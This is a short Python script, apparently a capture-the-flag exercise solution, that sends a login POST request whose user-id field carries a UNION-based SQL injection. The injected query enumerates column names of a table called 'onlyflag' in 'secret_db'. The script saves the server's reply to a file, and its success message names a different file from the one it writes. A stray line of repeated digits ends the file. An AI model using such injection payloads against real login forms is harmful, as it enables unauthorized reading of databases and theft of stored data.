import requests

# 요청할 URL
url = 'https://www.google.com/'
data = {
    'uid': "' UNION SELECT (SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'onlyflag' AND table_schema = 'secret_db' LIMIT 1), 2, 3, 4--",
    'upw': '1'
}

try:
    # POST 요청 보내기
    res = requests.post(url, data=data)

    # 응답 텍스트를 파일로 저장
    with open('response', 'w', encoding='utf-8') as file:
        file.write(res.text)

    print("응답이 response.txt 파일에 저장되었습니다.")

except requests.exceptions.RequestException as e:
    print(f"An error occurred: {e}")

 6666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666